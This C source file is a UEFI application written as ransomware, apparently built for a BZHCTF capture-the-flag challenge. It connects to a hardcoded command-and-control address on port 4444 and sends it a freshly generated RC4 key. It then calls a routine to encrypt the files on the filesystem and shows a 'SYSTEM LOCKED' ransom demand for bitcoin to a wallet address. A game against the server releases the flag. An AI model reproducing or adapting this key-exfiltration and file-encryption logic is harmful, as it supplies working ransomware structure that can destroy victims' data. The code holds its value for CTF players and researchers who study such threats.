#include <Uefi.h>

#include <Library/UefiLib.h>
#include <Library/UefiApplicationEntryPoint.h>

#include <Library/UefiBootServicesTableLib.h> // gBS
#include <Library/MemoryAllocationLib.h>
#include <Protocol/Tcp4.h>
#include <Protocol/ServiceBinding.h>


#include "DHCP_BZH.h"
#include "RC4_BZH.h"
#include "Game.h"
#include "EncryptFiles_BZH.h"



UINT8 Rc4Key[RC4_KEY_SIZE];

EFI_STATUS TcpSend(EFI_TCP4_PROTOCOL *Tcp4, UINT8 *Data, UINT32 Length)
{
  EFI_STATUS Status = 0x1;
  EFI_TCP4_IO_TOKEN TxToken;
  EFI_TCP4_TRANSMIT_DATA TxData;

  TxData.Push = TRUE;
  TxData.Urgent = TRUE;
  TxData.DataLength = Length + 2; // Mysterious EDK2 bug, need to add 2
  TxData.FragmentCount = 1;
  TxData.FragmentTable[0].FragmentLength = Length + 2; // Mysterious EDK2 bug, need to add 2
  TxData.FragmentTable[0].FragmentBuffer = Data;

  TxToken.Packet.TxData = &TxData;
  Status = Tcp4->Transmit(Tcp4, &TxToken);
  if (EFI_ERROR(Status))
  {
    Print(L"Failed to send data : %r\n", Status);
  }
  return Status;
}

EFI_STATUS TcpReceive(EFI_TCP4_PROTOCOL *Tcp4, UINT8 *BufferOut, UINT32 BufferOutSize)
{
  EFI_STATUS Status;
  EFI_TCP4_IO_TOKEN RxToken;
  EFI_TCP4_RECEIVE_DATA RxData;

  RxData.UrgentFlag = TRUE;
  RxData.FragmentCount = 1;
  RxData.DataLength = BufferOutSize;
  RxData.FragmentTable[0].FragmentLength = BufferOutSize;
  RxData.FragmentTable[0].FragmentBuffer = BufferOut;

  RxToken.Packet.RxData = &RxData;

  Status = Tcp4->Receive(Tcp4, &RxToken);
  if (EFI_ERROR(Status))
  {
    Print(L"Failed to receive data %r\n", Status);
    return Status;
  }

  return EFI_SUCCESS;
}

EFI_STATUS ConnectAndPlay(EFI_HANDLE ImageHandle, EFI_IPv4_ADDRESS ServerIp, UINT16 ServerPort, UINT8 *BufferForTCP)
{

  EFI_STATUS Status;
  EFI_SERVICE_BINDING_PROTOCOL *Tcp4ServiceBinding;
  EFI_HANDLE Tcp4ChildHandle = NULL;
  EFI_TCP4_CONFIG_DATA Tcp4ConfigData;
  EFI_TCP4_CONNECTION_TOKEN ConnectionToken;
  EFI_TCP4_PROTOCOL *Tcp4Protocol;
  EFI_IPv4_ADDRESS ClientIp;

  ZeroMem(&ClientIp, sizeof(ClientIp));

  // Get an IPv4
  Status = GetDhcp4Address(ImageHandle, &ClientIp);
  if (EFI_ERROR(Status))
  {
    return Status;
  }

  // Locate the TCP4 service binding protocol
  Status = gBS->LocateProtocol(&gEfiTcp4ServiceBindingProtocolGuid, NULL, (VOID **)&Tcp4ServiceBinding);
  if (EFI_ERROR(Status))
  {
    return Status;
  }

  // Create a child handle for the TCP4 protocol
  Status = Tcp4ServiceBinding->CreateChild(Tcp4ServiceBinding, &Tcp4ChildHandle);
  if (EFI_ERROR(Status))
  {
    return Status;
  }

  // Open the TCP4 protocol
  Status = gBS->HandleProtocol(Tcp4ChildHandle, &gEfiTcp4ProtocolGuid, (VOID **)&Tcp4Protocol);
  if (EFI_ERROR(Status))
  {
    Tcp4ServiceBinding->DestroyChild(Tcp4ServiceBinding, Tcp4ChildHandle);
    return Status;
  }

  // Prepare configuration data for the TCP stack
  Tcp4ConfigData.AccessPoint.UseDefaultAddress = TRUE;
  Tcp4ConfigData.AccessPoint.StationPort = 0;
  Tcp4ConfigData.AccessPoint.RemotePort = ServerPort;
  Tcp4ConfigData.AccessPoint.ActiveFlag = TRUE;
  CopyMem(&Tcp4ConfigData.AccessPoint.RemoteAddress, &ServerIp, sizeof(EFI_IPv4_ADDRESS));

  // Setup configuration
  Status = Tcp4Protocol->Configure(Tcp4Protocol, &Tcp4ConfigData);
  if (EFI_ERROR(Status))
  {
    Tcp4ServiceBinding->DestroyChild(Tcp4ServiceBinding, Tcp4ChildHandle);
    return Status;
  }

  // Connect to """C2"""
  Status = Tcp4Protocol->Connect(Tcp4Protocol, &ConnectionToken);
  if (EFI_ERROR(Status))
  {
    Tcp4Protocol->Configure(Tcp4Protocol, NULL);
    Tcp4ServiceBinding->DestroyChild(Tcp4ServiceBinding, Tcp4ChildHandle);
    return Status;
  }

  Status = GenerateRc4Key(Rc4Key, RC4_KEY_SIZE);
  if (EFI_ERROR(Status))
  {
    return Status;
  }


  gBS->Stall(1000000);

  // Send the RC4 Key used to encrypt the files to the C2
  Status = TcpSend(Tcp4Protocol, Rc4Key, RC4_KEY_SIZE);
  if (EFI_ERROR(Status))
  {
    return Status;
  }

  gBS->Stall(1000000);

  // Receive the encrypted RC4 key
  Status = TcpReceive(Tcp4Protocol, BufferForTCP, 256);
  if (EFI_ERROR(Status))
  {
    Print(L"Failed to receive encrypted RC4 key (RSA): %r\n", Status);
    return Status;
  }

  gBS->Stall(1000000);
  // Will encrypt all files on the filesystem (non-recursive => prevent player to do mistake)
  initEncryption(Rc4Key, BufferForTCP);
  // Number of client wins ; should be 3 to get the flag
  UINT8 gameWon = 0;

  // 3 Games to play
  for (int gamePlayed = 1; gamePlayed <= 3; gamePlayed++)
  {

    Print(L"\nRound n° %d\n", gamePlayed);
    Print(L"Me %d - %d You\n", gamePlayed - 1 - gameWon, gameWon);

    while (1)
    {
      gBS->Stall(1000000);
      Status = TcpReceive(Tcp4Protocol, BufferForTCP, 2);
      gBS->Stall(1000000);
      if (EFI_ERROR(Status))
      {
        Print(L"Failure to receive hacker's intentions: %r\n", Status);
        return Status;
      }

      Print(L"> I played\n");

      // This function return TRUE if the hacker reach (0,0)
      if (HackerMove(BufferForTCP[0], BufferForTCP[1]))
      {
        Print(L"I warned you I was unplayable.... You lost this game...\n");
        break;
      }
      else
      {

        // Invalid position
        UINT8 X = 255, Y = 255;
        BOOLEAN isPlayerWINNING = PlayerMove(&X, &Y);
        gBS->Stall(1000000);

        // Weird stuff about edk2 ft. qemu, don't known if it's a stack size problem but can't allocate more variables before refactoring and need to reuse variables :/
        Rc4Key[0] = X;
        Rc4Key[1] = Y;

        // Send player move
        Status = TcpSend(Tcp4Protocol, Rc4Key, 2);
        if (EFI_ERROR(Status))
        {
          Print(L"Failure to send loser positions: %r\n", Status);
          return Status;
        }

        if (isPlayerWINNING)
        {
          ++gameWon;

          // Again don't know why but need to check here the winning, mb TC4 stack is very weird
          if (gameWon == 3)
          {
            gBS->Stall(2000000);
            Status = TcpReceive(Tcp4Protocol, BufferForTCP, 1024);
            if (EFI_ERROR(Status))
            {
              Print(L"Failure to get the flag. Contact BZHCTF challmaker %r\n", Status);
            }
            else
            {
              Print(L"How is this possible? No one has ever beaten me at my game! I must admit defeat .... Here's your reward : \n%a\n", BufferForTCP);
            }
            return Status;
          }
          else
          {
            Print(L"> Well done... but it won't happen again!\n");
            break;
          }
        }
      }
    }
  }

  Print(L"> I'm too strong! Sorry for your files but I warned you, bye bye\n");
  return EFI_SUCCESS;
}


EFI_STATUS
EFIAPI
UefiMain(
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable)
{
  EFI_STATUS Status;
  UINT8 BufferForTCP[1024] = {};

  SystemTable->ConOut->SetAttribute(SystemTable->ConOut, EFI_BACKGROUND_RED | EFI_WHITE);
  SystemTable->ConOut->ClearScreen(SystemTable->ConOut);

  Print(L" =================== ~~~~~ ===================\n");
  Print(L"             !!! SYSTEM LOCKED !!!\n");
  Print(L" =================== ~~~~~ ===================\n");

  Print(L"\n\n");
  Print(L"All the files on your disks have been encrypted! Please send 1337 BTC to 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH in order to recover your files\n\n");
  Print(L"But I'm a great player! I'll give you a way out if you beat me at my favorite game. But watch out, I've got several gold medals in the discipline and the slightest false move on your part will be fatal for ever! Think before you leap!\n\n");
  Print(L"Press any key to lose the game...\n\n\n");

  Print(L" =================== ~~~~~ ===================\n");
  Print(L"             !!! SYSTEM LOCKED !!!\n");
  Print(L" =================== ~~~~~ ===================\n");

  SystemTable->BootServices->WaitForEvent(1, &SystemTable->ConIn->WaitForKey, NULL); // Wait user input key
  SystemTable->ConOut->ClearScreen(SystemTable->ConOut);

  EFI_IPv4_ADDRESS ServerIp = {.Addr = {192, 168, 199, 145}};
  UINT16 ServerPort = 4444;

  Status = ConnectAndPlay(ImageHandle, ServerIp, ServerPort, BufferForTCP);
  if (EFI_ERROR(Status))
  {
    Print(L"Failed to ConnectAndPlay : %r\n", Status);
    gBS->Stall(30000000);
    return Status;
  }

  SystemTable->BootServices->WaitForEvent(1, &SystemTable->ConIn->WaitForKey, NULL); // Wait user input key
  return EFI_SUCCESS;
}
